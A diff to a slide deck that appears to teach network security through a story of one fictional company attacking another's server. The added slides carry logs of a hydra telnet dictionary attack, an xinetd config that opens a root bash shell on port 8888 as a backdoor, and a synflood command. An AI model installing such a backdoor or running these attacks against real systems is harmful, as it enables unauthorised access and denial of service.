@@ -95,16 +95,16 @@
 						>>>
 						### Meeting at Rakutan company
 						- - -
-						<img src="./img/conference.png" style="width: 450px; display: block; margin: auto; padding: 10px;"></img>
+						<img src="./img/conference.png" style="width: 450px; display: block; margin: auto; padding: 10px;"></img> <!-- .element: class="fragment" data-fragment-index="0" -->
 
-						One day, at Rakutan company, a meeting was held to win the competition with Amazan company.
+						One day, at Rakutan company, a meeting was held to win the competition with Amazan company. <!-- .element: class="fragment" data-fragment-index="0" -->
 
 						>>>
 						### Result of the meeting
 						- - -
 						<img src="./img/person.png" style="padding: 10px;"></img>
 
-						The boss Sherry is appointed as the person responsible for stealing the confidential information of Amazan company.
+						The Sherry is appointed as the person responsible for stealing the confidential information of Amazan company.
 
 						>>>
 						<img src="./img/person.png"></img>
@@ -158,7 +158,7 @@ The session file ./hydra.restore was written. Type "hydra -R" to resume session.
 						<img src="./img/right-arrow-fat.png"></img>
 						<img src="./img/tds.png"></img>
 
-						Richard gets ID and password of Amazan company's server. <!-- .element: class="fragment" data-fragment-index="0" -->  
+						Richard gets ID and password to login server. <!-- .element: class="fragment" data-fragment-index="0" -->  
 
 						Richard knows how to connect the server. <!-- .element: class="fragment" data-fragment-index="1" -->
 
@@ -194,8 +194,23 @@ The session file ./hydra.restore was written. Type "hydra -R" to resume session.
 						- - -
 						<img src="./img/ns-da.png" width=300></img>
 
-						### GET ID & PASSWORD <!-- .element: class="fragment" data-fragment-index="0" -->
+						### GET PASSWORD <!-- .element: class="fragment" data-fragment-index="0" -->
 						### TO LOGIN WEB SERVER <!-- .element: class="fragment" data-fragment-index="0" -->
+
+						>>>
+						### Dictionary attack log
+						- - -
+						```
+# ./hydra -l a -P ../words.japanese telnet://192.168.0.1
+...
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-11-28 15:25:57
+...
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 115599 login tries (l:1/p:115599), ~451 tries per task
+[DATA] attacking service telnet on port 23
+[STATUS] 149.00 tries/min, 149 tries in 00:01h, 115450 todo in 12:55h, 16 active
+[STATUS] 104.26 tries/min, 318 tries in 00:03h, 115281 todo in 18:26h, 16 active
+[23][telnet] host: 192.168.0.1   login: a   password: aichi
+						```
 
 						>>>
 						### Ptrace attack on the web server
@@ -232,9 +247,47 @@ root
 						- - -
 						<img src="./img/ns-bd.png" width=400></img>
 
+						>>>
+						### Install a backdoor log 1.
+						- - -
+						```
+sh-2.05# cd /etc
+sh-2.05# ls
+CORBA               gnome                 ld.so.cache     pam.d         securetty
+DIR_COLORS          gnome-vfs-mime-magic  ld.so.conf      paper.config  securetty.org
+X11                 gpm-root.conf         locale          passwd        security
+adjtime             group                 localtime       passwd-       sendmail.cf
+aliases             group-                localtime.org   ppp           services
+aliases.db          gtk                   login.defs      printcap      shadow
+bashrc              host.conf             logrotate.conf  profile       shadow-
+conf.linuxconf      hosts                 logrotate.d     profile.d     shadow.org
+						```
+
+						>>>
+						### Install a backdoor log 2.
+						```
+service backdoor
+{
+socket_type = stream
+wait = no
+user = root
+server = /bin/bash
+server_args = -i
+protocol = tcp
+port = 8888
+}
+
+"backdoor" [New] 10L, 127C written
+
+sh-2.05# ls /etc/xinetd.d
+backdoor     daytime      echo-udp  ipop2          pop3s   time
+chargen      daytime-udp  imap      ipop3          rsync   time-udp
+chargen-udp  echo         imaps     linuxconf-web  telnet  wu-ftpd
+						```
+
 						---
 						## Chapter 4.
-						### Pingflood attack
+						### Next attack
 
 						>>>
 						### Pingflood attack on web server
@@ -246,9 +299,18 @@ root
 						>>>
 						### Pingflood attack log
 						- - -
+						```
+# /bin/bash ./synflood 192.168.0.1 23
+attack to 192.168.0.1 port 23\n
+Next\n
+Next\n
+Next\n
+Next\n
+						```
 
 						---
 						## Chapter 5.
+						### After server down
 
 						>>>
 						![user](./img/person.png)
@@ -293,7 +355,7 @@ root
 
 						---
 						## Chapter 6.
-						### 
+						### Backdoor still remains
 
 						>>>
 						<img src="./img/ns-fw1.png" width=400></img>
@@ -334,6 +396,17 @@ root
 						![user](./img/server.png)
 
 						### THE BACKDOOR IS FOUND! <!-- .element: class="fragment" data-fragment-index="1" -->
+
+						>>>
+						### Bob's investigation log
+						- - -
+						```
+sh-2.05# ls /etc/xinetd.d
+backdoor     daytime      echo-udp  ipop2          pop3s   time
+chargen      daytime-udp  imap      ipop3          rsync   time-udp
+chargen-udp  echo         imaps     linuxconf-web  telnet  wu-ftpd
+						```
+
 
 						>>>
 						Bob deleted the backdoor.
